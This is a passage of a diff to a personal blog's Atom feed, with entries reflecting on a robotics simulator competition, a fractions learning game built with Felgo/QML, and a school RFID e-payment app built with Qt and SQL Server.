https://trebledj.me/img/posts/projects/03-rdc-simulator/assets/winner-2828w.webp 2828w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 2828px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;So was the RDC playable? Yes.
+&lt;ul&gt;
+&lt;li&gt;&lt;s&gt;When developing the simulator, we didn&#39;t have a working program to test if the game can be completed. So it was a relief when some teams managed to finish.&lt;/s&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Did it meet our objectives of testing trainees&#39; technical and soft skills? Also yes... to some extent.
+&lt;ul&gt;
+&lt;li&gt;Some groups had free riders. There was a case where a group only had one teammate remaining...&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Some wisdom to takeaway:&lt;/p&gt;
+&lt;div class=&quot;alert alert-success d-flex align-items-start&quot;&gt; &lt;i class=&quot;fas fa-lightbulb ms-1 me-3 mt-1 fs-4&quot; role=&quot;img&quot;&gt;&lt;/i&gt; &lt;div class=&quot;alert-content flex-fill mt-0&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;Plan things ahead. It&#39;s better to resolve problems earlier on than later down the road. If your product is used by a lot of users, changing something drastic later on may affect your users negatively.&lt;/li&gt;
+&lt;li&gt;Be organised. Know what to-dos exist, which ones are more important, and when they should be done.&lt;/li&gt;
+&lt;li&gt;Remember to initialise your Box2D &lt;code&gt;b2vec2&lt;/code&gt;s unless you want your physics intentionally broken.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Also, some final reflections:&lt;/p&gt;
+&lt;div class=&quot;alert alert-warning d-flex align-items-start&quot;&gt; &lt;i class=&quot;fas fa-triangle-exclamation ms-1 me-3 mt-1 fs-4&quot; role=&quot;img&quot;&gt;&lt;/i&gt; &lt;div class=&quot;alert-content flex-fill mt-0&quot;&gt;
+&lt;ul&gt;
+&lt;li&gt;We had planned a roadmap but started lagging behind. Perhaps the goals were slightly unrealistic, or we didn&#39;t consider the stress of the exam period. In my eyes, we could have pushed things a bit earlier so that the trainees had more time to plan. The final features (Demo Mode) were slightly rushed at the end.&lt;/li&gt;
+&lt;li&gt;Coding-wise, I think we did okay. The only thing to improve was our intellectual capacity so that we could write more sophisticated simulations. Some sensors were hacked together rather awkwardly. But learning takes time.&lt;/li&gt;
+&lt;li&gt;Probably one thing we could&#39;ve done better was provide more tips for the trainees. I heard from other seniors that some trainees had difficulty merging their code (which was one way we tested collaborative skills).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;&lt;/div&gt;
+</content>
+        
+          <category>project</category>
+        
+          <category>project</category>
+        
+          <category>qt</category>
+        
+          <category>cpp</category>
+        
+          <category>robotics</category>
+        
+          <category>software-engineering</category>
+        
+          <category>apps</category>
+        
+          <category>hkust</category>
+        
+          <category>reflection</category>
+        
+      </entry>
+    
+  
+    
+      
+      <entry>
+        <title>Fractons</title>
+        <description>An interactive fractions game for elementary students made using Felgo/QML.</description>
+        <link href="https://trebledj.me/posts/fractons/"/>
+        <updated>2019-05-24T00:00:00Z</updated>
+        <id>https://trebledj.me/posts/fractons/</id>
+        <content xml:lang="en" type="html">&lt;p&gt;Fractons is an educational, interactive fractions game for elementary students made using Felgo/QML. The project is published &lt;a href=&quot;https://github.com/TrebledJ/fractons&quot;&gt;online&lt;/a&gt; along with a &lt;a href=&quot;https://github.com/TrebledJ/fractons/releases/tag/v1.0&quot;&gt;release build for macOS&lt;/a&gt;.&lt;/p&gt;
+&lt;h3 id=&quot;features&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/fractons/#features&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Features&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Exp + Levelling Mechanics 📈&lt;/li&gt;
+&lt;li&gt;Clean, slick, and bubbly UI&lt;/li&gt;
+&lt;li&gt;5 different question modes!&lt;/li&gt;
+&lt;li&gt;40+ achievements (including secret achievements! 🤫)&lt;/li&gt;
+&lt;li&gt;Statistics, to see how well you&#39;re doing&lt;/li&gt;
+&lt;li&gt;Fun little lottery system&lt;/li&gt;
+&lt;li&gt;Number pad (for mobile/tablets), configurable in settings&lt;/li&gt;
+&lt;li&gt;Daily quests! 🤠&lt;/li&gt;
+&lt;li&gt;SFX and background music 🎵&lt;/li&gt;
+&lt;li&gt;Floating fractions in the background (with the occasional secret! 🤫)&lt;/li&gt;
+&lt;li&gt;Notifications to notify you when you level up, complete a quest, or earn an achievement&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;showcase&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/fractons/#showcase&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Showcase&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Fractons: Main Menu&quot; href=&quot;https://trebledj.me/img/posts/projects/02-fractons/assets/img2-1916w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-85&quot; src=&quot;https://trebledj.me/img/posts/projects/02-fractons/assets/img2-1916w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 1916 / 1276&quot; alt=&quot;Fractons: Main Menu&quot; title=&quot;Fractons: Main Menu&quot; srcset=&quot;https://trebledj.me/img/posts/projects/02-fractons/assets/img2-256w.webp 256w, https://trebledj.me/img/posts/projects/02-fractons/assets/img2-512w.webp 512w, https://trebledj.me/img/posts/projects/02-fractons/assets/img2-1024w.webp 1024w, https://trebledj.me/img/posts/projects/02-fractons/assets/img2-1916w.webp 1916w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1916px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p class=&quot;caption&quot;&gt;&lt;sup&gt;Main menu. Daily quests are on the left. Achievements, statistics on the top left. Notifications and settings on the top right.&lt;/sup&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Fractons: Solver UI&quot; href=&quot;https://trebledj.me/img/posts/projects/02-fractons/assets/img4-1909w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-85&quot; src=&quot;https://trebledj.me/img/posts/projects/02-fractons/assets/img4-1909w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 1909 / 1273&quot; alt=&quot;Fractons: Solver UI&quot; title=&quot;Fractons: Solver UI&quot; srcset=&quot;https://trebledj.me/img/posts/projects/02-fractons/assets/img4-256w.webp 256w, https://trebledj.me/img/posts/projects/02-fractons/assets/img4-512w.webp 512w, https://trebledj.me/img/posts/projects/02-fractons/assets/img4-1024w.webp 1024w, https://trebledj.me/img/posts/projects/02-fractons/assets/img4-1909w.webp 1909w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1909px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p class=&quot;caption&quot;&gt;&lt;sup&gt;Solving questions in Balance mode. How fast can you fill in the question mark?&lt;/sup&gt;&lt;/p&gt;
+&lt;div class=&quot;center rw mb-2  lightbox-gallery&quot;&gt;
+&lt;a class=&quot;&quot; title=&quot;Fractons: Achievements!&quot; href=&quot;https://trebledj.me/img/posts/projects/02-fractons/assets/img5-1913w.webp&quot;&gt;&lt;img class=&quot;jw-45 multi&quot; src=&quot;https://trebledj.me/img/posts/projects/02-fractons/assets/img5-1913w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 1913 / 1280&quot; alt=&quot;Fractons: Achievements!&quot; title=&quot;Fractons: Achievements!&quot; srcset=&quot;https://trebledj.me/img/posts/projects/02-fractons/assets/img5-256w.webp 256w, https://trebledj.me/img/posts/projects/02-fractons/assets/img5-512w.webp 512w, https://trebledj.me/img/posts/projects/02-fractons/assets/img5-1024w.webp 1024w, https://trebledj.me/img/posts/projects/02-fractons/assets/img5-1913w.webp 1913w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1913px&quot; /&gt;&lt;/a&gt;
+&lt;a class=&quot;&quot; title=&quot;Fractons: More Achievements!&quot; href=&quot;https://trebledj.me/img/posts/projects/02-fractons/assets/img6-1915w.webp&quot;&gt;&lt;img class=&quot;jw-45 multi&quot; src=&quot;https://trebledj.me/img/posts/projects/02-fractons/assets/img6-1915w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 1915 / 1278&quot; alt=&quot;Fractons: More Achievements!&quot; title=&quot;Fractons: More Achievements!&quot; srcset=&quot;https://trebledj.me/img/posts/projects/02-fractons/assets/img6-256w.webp 256w, https://trebledj.me/img/posts/projects/02-fractons/assets/img6-512w.webp 512w, https://trebledj.me/img/posts/projects/02-fractons/assets/img6-1024w.webp 1024w, https://trebledj.me/img/posts/projects/02-fractons/assets/img6-1915w.webp 1915w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1915px&quot; /&gt;&lt;/a&gt;
+&lt;/div&gt;
+&lt;p class=&quot;caption&quot;&gt;&lt;sup&gt;Tons of achievements to try to earn!&lt;/sup&gt;&lt;/p&gt;
+&lt;h3 id=&quot;history&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/fractons/#history&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; History&lt;/h3&gt;
+&lt;p&gt;Fractons was originally programmed in Flash/Actionscript 2.0 for a ninth grade design project targetting fifth/sixth graders. It was later reprogrammed in a more appealing UI with user engagement features such as daily quests and a lottery.&lt;/p&gt;
+</content>
+        
+          <category>project</category>
+        
+          <category>project</category>
+        
+          <category>qml</category>
+        
+          <category>software-engineering</category>
+        
+          <category>felgo</category>
+        
+          <category>js</category>
+        
+          <category>qt</category>
+        
+          <category>learning</category>
+        
+          <category>apps</category>
+        
+          <category>mathematics</category>
+        
+      </entry>
+    
+  
+    
+      
+      <entry>
+        <title>E-Payment Desktop Application and System</title>
+        <description>A reflection of my first large-scale project: an e-payment system plus cross-platform desktop application made using Qt.</description>
+        <link href="https://trebledj.me/posts/e-payment-desktop-application/"/>
+        <updated>2019-05-01T00:00:00Z</updated>
+        <id>https://trebledj.me/posts/e-payment-desktop-application/</id>
+        <content xml:lang="en" type="html">&lt;p&gt;This project involved creating a functioning e-payment system to be integrated at our high school&#39;s cafeteria.&lt;/p&gt;
+&lt;h3 id=&quot;context&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/e-payment-desktop-application/#context&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Context&lt;/h3&gt;
+&lt;p&gt;I was in my penultimate year of high school and summer was approaching. At the time, every single student had a student ID card. They were simple in design with the usual portrait, student name, and expiry date. A friend came to me and suggested &amp;quot;evolving&amp;quot; the student card to be able to use it for electronic transactions (e-payment). The idea is akin to using an &lt;a href=&quot;https://en.wikipedia.org/wiki/Octopus_card&quot;&gt;MTR Octopus&lt;/a&gt; to pay for goodies instead of having to scramble for cash and perform the entire process of calculating plus giving change.&lt;/p&gt;
+&lt;p&gt;To give a bit more background, our school cafeteria has five to six different local vendors. The school would rent a stall out to tenants who would sell snacks and lunch during the appropriate hours. At the time, the only transaction method is cash.&lt;/p&gt;
+&lt;p&gt;Also, some background about the card: it&#39;s a &lt;a href=&quot;https://en.wikipedia.org/wiki/Radio-frequency_identification&quot;&gt;radio frequency ID (RFID)&lt;/a&gt; card. I won&#39;t go into the technical details of it, but basically you scan the card on a dedicated reader, and it can read a unique ID.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Exhibit A: an RFID&quot; href=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/rfid-613w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-45&quot; src=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/rfid-613w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 613 / 460&quot; alt=&quot;Exhibit A: an RFID&quot; title=&quot;Exhibit A: an RFID&quot; srcset=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/rfid-256w.webp 256w, https://trebledj.me/img/posts/projects/01-e-payment-app/assets/rfid-512w.webp 512w, https://trebledj.me/img/posts/projects/01-e-payment-app/assets/rfid-613w.webp 613w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, 613px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;development&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/e-payment-desktop-application/#development&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Development&lt;/h3&gt;
+&lt;h4 id=&quot;a-painful-start&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/e-payment-desktop-application/#a-painful-start&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; A Painful Start&lt;/h4&gt;
+&lt;p&gt;Now if you&#39;re an experienced software engineer, please bear with me as I take a walk down memory lane (or feel free to skip ahead).&lt;/p&gt;
+&lt;p&gt;Since I was young and naive at the time (and also because I was unfamiliar with web apps and other possible solutions), I decided to create a desktop application to perform the transactions.&lt;/p&gt;
+&lt;p&gt;Initially I started developing the application using SFML, since it was the only GUI framework I knew. After struggling with making buttons work and click properly, I switched to Qt which had some added advantages:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;It is a much more mature framework, meaning there were tons of resources and form posts available.&lt;/li&gt;
+&lt;li&gt;It has a drag-and-drop GUI editor.&lt;/li&gt;
+&lt;li&gt;There are UI classes for widgets (e.g. pushbuttons, checkboxes, listviews), so I didn&#39;t have to reinvent the wheel.&lt;/li&gt;
+&lt;li&gt;It was cross-platform, which was convenient in case the school&#39;s computer operating system is different.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;SFML is not cute.&quot; href=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/sfml-is-not-cute-750w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-45&quot; src=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/sfml-is-not-cute-750w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 750 / 500&quot; alt=&quot;SFML is not cute.&quot; title=&quot;SFML is not cute.&quot; srcset=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/sfml-is-not-cute-256w.webp 256w, https://trebledj.me/img/posts/projects/01-e-payment-app/assets/sfml-is-not-cute-512w.webp 512w, https://trebledj.me/img/posts/projects/01-e-payment-app/assets/sfml-is-not-cute-750w.webp 750w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, 750px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;alert alert-success d-flex align-items-start&quot;&gt; &lt;i class=&quot;fas fa-lightbulb ms-1 me-3 mt-1 fs-4&quot; role=&quot;img&quot;&gt;&lt;/i&gt; &lt;div class=&quot;alert-content flex-fill mt-0&quot;&gt;
+&lt;p&gt;If there was one thing I learned, it was to understand the problem first, research the appropriate tools, and &lt;em&gt;then&lt;/em&gt; start developing the solution. I wasted maybe two to four weeks coding a good GUI with SFML and scratching my head.&lt;/p&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;designing-a-robust-solution&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/e-payment-desktop-application/#designing-a-robust-solution&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Designing a Robust Solution&lt;/h4&gt;
+&lt;p&gt;Regardless, all the benefits brought by Qt allowed me to focus more on solving business logic issues. The logic issue? Well... there are several questions we should answer.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Who needs to use the application?&lt;/li&gt;
+&lt;li&gt;How do I store user data across applications?
+&lt;ul&gt;
+&lt;li&gt;This could be vendor data (e.g. food names, food prices) or student data (e.g. name, balance).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;To answer (1), we identify three groups of people: vendors, students, and admins. Admins are the school staff who will be responsible for updating a student&#39;s balance; similar to an MTR staff sitting in the customer service booth.&lt;/p&gt;
+&lt;p&gt;All three groups should have different access rights. For example, vendors and students shouldn&#39;t be able to add to their balance, only admins can do that.&lt;/p&gt;
+&lt;p&gt;Moreover, since their roles are different, the interfaces they see should also be different. A vendor shouldn&#39;t need to see an admin-level page, since it&#39;s unrelated to their function.&lt;/p&gt;
+&lt;p&gt;To solve (2), we &lt;em&gt;could&lt;/em&gt; simply use a text file. Load data on startup, save data every time something changes. But this only works for a single user on a single device. Well... that&#39;s what I actually did at the beginning, except I used a SQLite database (which is basically a glorified text file made convenient for SQL).&lt;/p&gt;
+&lt;p&gt;Now the problem with SQLite is that it&#39;s serverless. In plain English, it can&#39;t cope with multiple users well.&lt;/p&gt;
+&lt;p&gt;A better alternative was to use MySQL or Microsoft SQL Server, which is designed to handle multiple users (clients, to be precise). Eventually I went with SQL Server, since that was what our school was using.&lt;/p&gt;
+&lt;p&gt;How does MySQL and SQL Server connect with multiple clients across the network? This is something you&#39;ll have to ask the experts. :D&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Net-what?&quot; href=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/netwhat-509w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-45&quot; src=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/netwhat-509w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 509 / 499&quot; alt=&quot;Net-what?&quot; title=&quot;Net-what?&quot; srcset=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/netwhat-256w.webp 256w, https://trebledj.me/img/posts/projects/01-e-payment-app/assets/netwhat-509w.webp 509w&quot; sizes=&quot;(max-width: 256px) 256px, 509px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h4 id=&quot;sidenote-on-version-control&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/e-payment-desktop-application/#sidenote-on-version-control&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Sidenote on Version Control&lt;/h4&gt;
+&lt;p&gt;When undertaking &lt;em&gt;any&lt;/em&gt; project, it is crucial to have flexibility. A version control system offers this.&lt;/p&gt;
+&lt;p&gt;What is a version control system?&lt;/p&gt;
+&lt;p&gt;A version control system (VCS) is a software tool which in a sense, takes snapshots (commits) of files and keeps track of them. Traditionally, to keep separate versions of a file, you might copy-paste a folder, name it &amp;quot;myfolder-v2&amp;quot;, and so on. There are several reasons why you might want to do this, one example is that you want to keep a bunch of text from the old version and have it on hand if necessary.&lt;/p&gt;
+&lt;p&gt;VCSs take this idea of versioning and put it on steroids. While developing, you can do a bunch of things. You can jump back to an earlier snapshot (checkout). You could work on a new feature or bugfix (branch) concurrently. Flexibility.&lt;/p&gt;
+&lt;p&gt;Typically, VCSs are used by teams to effectively manage their code between team members. But they&#39;re also effective if you&#39;re coding alone! The (outdated) screenshots of the GUI in this post are here thanks to version control holding onto them. (I uploaded them but deleted them in one of my commits.)&lt;/p&gt;
+&lt;div class=&quot;alert alert-success d-flex align-items-start&quot;&gt; &lt;i class=&quot;fas fa-lightbulb ms-1 me-3 mt-1 fs-4&quot; role=&quot;img&quot;&gt;&lt;/i&gt; &lt;div class=&quot;alert-content flex-fill mt-0&quot;&gt;
+&lt;p&gt;If you&#39;re planning on doing a project (whether small, medium, or big) or even just cataloguing your learning process, consider using a VCS.&lt;/p&gt;
+&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;designing-the-gui&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/e-payment-desktop-application/#designing-the-gui&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Designing the GUI&lt;/h4&gt;
+&lt;p&gt;As mentioned before, there are three groups of users: vendors, students, and admins.&lt;/p&gt;
+&lt;p&gt;(The below screenshots are from a long-ago development version, for illustration purposes only.)&lt;/p&gt;
+&lt;p&gt;This is what the design for the vendor interface looks like:&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Vendor ordering UI.&quot; href=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/vendor-order-1279w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-85&quot; src=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/vendor-order-1279w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 1279 / 675&quot; alt=&quot;Vendor ordering UI.&quot; title=&quot;Vendor ordering UI.&quot; srcset=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/vendor-order-256w.webp 256w, https://trebledj.me/img/posts/projects/01-e-payment-app/assets/vendor-order-512w.webp 512w, https://trebledj.me/img/posts/projects/01-e-payment-app/assets/vendor-order-1024w.webp 1024w, https://trebledj.me/img/posts/projects/01-e-payment-app/assets/vendor-order-1279w.webp 1279w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1279px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Giant buttons on the left to select their customers&#39; orders. A list of selected items on the right. And some buttons down below.&lt;/p&gt;
+&lt;p&gt;The &lt;a href=&quot;https://www.optimizely.com/optimization-glossary/user-flow&quot;&gt;user flow&lt;/a&gt; for a transaction is:&lt;/p&gt;
+&lt;ol start=&quot;0&quot;&gt;
+&lt;li&gt;Cashiers log in.&lt;/li&gt;
+&lt;li&gt;Student orders food.&lt;/li&gt;
+&lt;li&gt;Cashier taps/clicks food items.&lt;/li&gt;
+&lt;li&gt;Program calculates subtotals and total cost.&lt;/li&gt;
+&lt;li&gt;Student scans their student ID.&lt;/li&gt;
+&lt;li&gt;Program verifies if student has enough balance and transacts.&lt;/li&gt;
+&lt;li&gt;Program records the transaction, updates the student&#39;s balance, and prints a receipt.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Most of these steps weren&#39;t automated in the beginning. But to reduce the chance of making mistakes (which humans are really good at!), it&#39;s best to automate as much as possible.&lt;/p&gt;
+&lt;p&gt;There are a couple other things vendors can do with the app:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Add menu items&lt;/li&gt;
+&lt;li&gt;View/print transaction summaries&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;But these are not very interesting.&lt;/p&gt;
+&lt;p&gt;Admins, of course, have a more powerful role. These peeps can view &lt;em&gt;and&lt;/em&gt; &lt;strong&gt;update&lt;/strong&gt; student&#39;s balances (but the actual flows are pretty boring TBH). (Unfortunately I did not save any screenshots of the GUI, and I&#39;m not bothered to redownload Qt just to build the app once. &amp;gt;.&amp;gt;)&lt;/p&gt;
+&lt;p&gt;&lt;a class=&quot;lightbox-single&quot; title=&quot;Unnnnnlliiiimmiiitted pooower!.&quot; href=&quot;https://trebledj.me/img/unlimited-power-800w.webp&quot;&gt;&lt;img class=&quot;mb-2 rw center jw-55&quot; src=&quot;https://trebledj.me/img/unlimited-power-800w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 800 / 450&quot; alt=&quot;Unnnnnlliiiimmiiitted pooower!.&quot; title=&quot;Unnnnnlliiiimmiiitted pooower!.&quot; srcset=&quot;https://trebledj.me/img/unlimited-power-256w.webp 256w, https://trebledj.me/img/unlimited-power-512w.webp 512w, https://trebledj.me/img/unlimited-power-800w.webp 800w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, 800px&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Students have the most &lt;em&gt;&lt;strong&gt;exciting&lt;/strong&gt;&lt;/em&gt; user flow of all.&lt;/p&gt;
+&lt;div class=&quot;center rw mb-2  lightbox-gallery&quot;&gt;
+&lt;a class=&quot;&quot; title=&quot;Standby UI, before scanning.&quot; href=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/standby-801w.webp&quot;&gt;&lt;img class=&quot;jw-45 multi&quot; src=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/standby-801w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 801 / 602&quot; alt=&quot;Standby UI, before scanning.&quot; title=&quot;Standby UI, before scanning.&quot; srcset=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/standby-256w.webp 256w, https://trebledj.me/img/posts/projects/01-e-payment-app/assets/standby-512w.webp 512w, https://trebledj.me/img/posts/projects/01-e-payment-app/assets/standby-801w.webp 801w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, 801px&quot; /&gt;&lt;/a&gt;
+&lt;a class=&quot;&quot; title=&quot;Standby UI, after scanning.&quot; href=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/standby-scanned-801w.webp&quot;&gt;&lt;img class=&quot;jw-45 multi&quot; src=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/standby-scanned-801w.webp&quot; loading=&quot;lazy&quot; decoding=&quot;async&quot; style=&quot;aspect-ratio: auto 801 / 602&quot; alt=&quot;Standby UI, after scanning.&quot; title=&quot;Standby UI, after scanning.&quot; srcset=&quot;https://trebledj.me/img/posts/projects/01-e-payment-app/assets/standby-scanned-256w.webp 256w, https://trebledj.me/img/posts/projects/01-e-payment-app/assets/standby-scanned-512w.webp 512w, https://trebledj.me/img/posts/projects/01-e-payment-app/assets/standby-scanned-801w.webp 801w&quot; sizes=&quot;(max-width: 256px) 256px, (max-width: 512px) 512px, 801px&quot; /&gt;&lt;/a&gt;
+&lt;/div&gt;
+&lt;p&gt;And since they have an exciting flow, I&#39;ll describe it for fun:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Walk up to the school&#39;s library computer.&lt;/li&gt;
+&lt;li&gt;Shake the mouse to wake up the monitor.&lt;/li&gt;
+&lt;li&gt;Take out their student card from their wallets or pockets.&lt;/li&gt;
+&lt;li&gt;If they lost their card, contact ICT support. They may need to pay for a replacement and the previous balance would be lost. :(&lt;/li&gt;
+&lt;li&gt;Otherwise, they haven&#39;t lost it. So they place the card on top of the RFID reader.&lt;/li&gt;
+&lt;li&gt;Wait one second for the reader to scan the card.&lt;/li&gt;
+&lt;li&gt;Watch their card ID appear on the screen.&lt;/li&gt;
+&lt;li&gt;Absorb the details shown on a second page (card number, student ID, balance, whether the card is active).&lt;/li&gt;
+&lt;li&gt;Leave the site.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Exciting, right?&lt;/p&gt;
+&lt;h3 id=&quot;current-status&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/e-payment-desktop-application/#current-status&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Current Status&lt;/h3&gt;
+&lt;p&gt;It&#39;s been several years since the e-payment system was launched in the summer of 2019, and I hope it has proven useful during the Covid-19 pandemic as students and teachers can avoid spreading germs through cash transactions (coins and cash can be quite dirty!).&lt;/p&gt;
+&lt;p&gt;When I asked a student about it this year (2022), they said that the entire system was &lt;em&gt;still&lt;/em&gt; up and running (a good sign!). Moreover, the school&#39;s ICT team has expanded it as a locking mechanism for student lockers. Hopefully it will become a reliable piece of technology and make the school environment safe, clean, and fast.&lt;/p&gt;
+&lt;h3 id=&quot;takeaways&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;md-anchor&quot; href=&quot;https://trebledj.me/posts/e-payment-desktop-application/#takeaways&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt; Takeaways&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Spend some time researching the problem you&#39;re trying to solve and the possible solutions. You&#39;ll accrue less &lt;a href=&quot;https://en.wikipedia.org/wiki/Technical_debt&quot;&gt;technical debt&lt;/a&gt; and thank yourself in the future.&lt;/li&gt;
+&lt;li&gt;Use a version control system for flexibility and to keep track of history.&lt;/li&gt;
+&lt;li&gt;Don&#39;t be afraid to try something new. The journey might just be worth it.&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        
+          <category>project</category>
+        
+          <category>software-engineering</category>
+        
+          <category>qt</category>
+        
+          <category>cpp</category>
+        
+          <category>sql</category>
+        
+          <category>apps</category>
+        
+          <category>reflection</category>
+        
+      </entry>
+    
+  
+</feed>
